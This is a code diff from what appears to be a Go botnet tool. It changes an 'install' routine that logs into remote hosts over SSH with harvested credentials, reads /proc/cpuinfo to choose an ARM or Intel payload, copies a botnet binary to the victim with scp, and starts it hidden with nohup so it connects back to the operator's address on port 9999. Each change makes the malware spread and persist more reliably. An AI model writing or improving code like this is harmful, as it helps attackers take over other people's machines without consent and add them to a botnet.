@@ -86,6 +86,27 @@ func (a *Attack) install(c *credential) {
 		nodeOS = "osx"
 	}
 
+	arch := "intel"
+	if nodeOS == "linux" {
+		fmt.Println("[*] getting architecture")
+		sess, err := getSSHSession(c.host, c.username, c.password)
+		if err != nil {
+			fmt.Printf("[ERROR] creating ssh session %v\n", err)
+			return
+		}
+		cmd := "cat /proc/cpuinfo | grep 'model name'"
+		out1, err := sess.Output(cmd)
+		if err != nil {
+			fmt.Printf("[ERROR] getting architecture %v\n", err)
+			return
+		}
+		sess.Close()
+
+		if strings.Contains(string(out1), "ARM") {
+			arch = "arm"
+		}
+	}
+
 	// create the botnet bin path
 	fmt.Println("[*] creating botnet bin dir")
 	sess, err = getSSHSession(c.host, c.username, c.password)
@@ -105,7 +126,13 @@ func (a *Attack) install(c *credential) {
 		fmt.Printf("[ERROR] creating ssh session %v\n", err)
 		return
 	}
-	if err := scp(fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/botnet", nodeOS), strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
+
+	path := fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/botnet", nodeOS)
+	if nodeOS == "linux" {
+		path = fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/%s/botnet", nodeOS, arch)
+	}
+
+	if err := scp(path, strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
 		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
 		return
 	}
@@ -117,7 +144,7 @@ func (a *Attack) install(c *credential) {
 		return
 	}
 	localIP := getLocalIP()
-	cmd = strings.TrimSpace(string(out)) + "/botnet/bin/botnet -target " + localIP + " -port 9999 connect"
+	cmd = fmt.Sprintf("nohup %s/botnet/bin/botnet -target %s -port 9999 connect > /dev/null 2>&1 &", strings.TrimSpace(string(out)), localIP)
 	if err := a.execute(cmd, sess); err != nil {
 		fmt.Printf("[ERROR] executing botnet %v\n", err)
 		return
